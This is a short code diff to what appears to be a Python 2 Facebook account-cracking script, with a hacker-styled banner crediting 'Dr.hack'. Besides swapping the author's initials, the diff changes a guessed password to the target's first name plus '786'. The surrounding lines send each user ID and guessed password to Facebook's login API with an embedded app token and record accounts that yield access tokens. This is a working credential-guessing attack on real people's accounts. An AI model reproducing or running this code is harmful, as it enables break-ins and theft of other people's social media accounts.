@@ -45,7 +45,7 @@ logo = """
  |_|   |_|_|     |_____/  \___/
 
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
+\033[1;96mAuthor  \033[1;93m: \033[1;92mFD
 \033[1;96mYouTube \033[1;93m: \033[1;92mDr.hack
 \033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/fahadkhan9136/fahad
 \033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/fahadkhan9131
@@ -66,7 +66,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
+\033[1;96mAuthor  \033[1;93m: \033[1;92mFD
 \033[1;96mYouTube \033[1;93m: \033[1;92mDr.hack
 \033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/fahadkhan9136/fahad
 \033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/fahadkhan9131
@@ -322,7 +322,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'india123'
+									pass4 = b['first_name'] + '786'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
